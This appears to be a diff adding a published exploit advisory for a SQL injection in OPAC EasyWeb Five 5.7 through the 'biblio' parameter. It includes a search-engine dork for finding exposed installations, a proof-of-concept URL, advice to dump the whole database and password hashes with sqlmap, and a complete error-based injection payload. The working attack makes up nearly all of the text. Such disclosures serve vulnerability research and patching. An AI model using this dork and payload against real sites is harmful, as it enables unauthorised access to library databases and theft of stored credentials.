@@ -1,0 +1,21 @@
+# Exploit Title: OPAC EasyWeb Five 5.7 - 'biblio' SQL Injection
+# Dork: inurl:"index.php?scelta=campi"
+# Date: 2018-10-02
+# Exploit Author: Dino Barlattani
+# Vendor Homepage: http://www.nexusfi.it/
+# Software Link: http://www.nexusfi.it/easyweb.php
+# Version: 5.7
+# Category: Webapps
+# Platform: PHP
+# CVE: N/A
+
+# POC:
+# http://(server ip)/easyweb/w2001/index.php?scelta=campi&&biblio=RT10AH[SQL]&lang=
+
+# You can use sqlmap for dump entire database and dumping hash
+
+scelta=campi&&biblio=RT10AH' AND ROW(3677,8383)>(SELECT
+COUNT(*),CONCAT(0x7176627a71,(SELECT
+(ELT(3677=3677,1))),0x71767a7a71,FLOOR(RAND(0)*2))x FROM (SELECT 8278 UNION
+SELECT 2746 UNION SELECT 1668 UNION SELECT 1526)a GROUP BY x) AND
+'CrYc'='CrYc&lang=
